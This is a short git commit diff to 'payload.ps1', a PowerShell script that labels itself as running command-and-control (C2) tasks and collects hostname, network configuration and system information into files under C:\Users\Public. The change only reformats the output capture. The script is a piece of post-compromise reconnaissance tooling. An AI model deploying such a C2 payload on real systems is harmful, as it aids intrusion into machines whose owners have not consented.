4b77d906c1f0dd5fe389cce14bd55fc00f502526
kenawhy <108243883+kenawhy@users.noreply.github.com>
2024-10-31 20:26:08 +0900

    updated payload commands

--- payload.ps1
+++ payload.ps1
@@ -3,10 +3,10 @@
 Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\Public\c2_log.txt" -Append
 
 # Task 1: Gather system information
-$hostname = hostname
-$ipconfig = ipconfig
-$systeminfo = systeminfo
+$hostname = (hostname)
+$ipconfig = (ipconfig | Out-String)
+$systeminfo = (systeminfo | Out-String)
 
 # Combine information into one variable and save it to a file
 $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
-$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"s
+$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
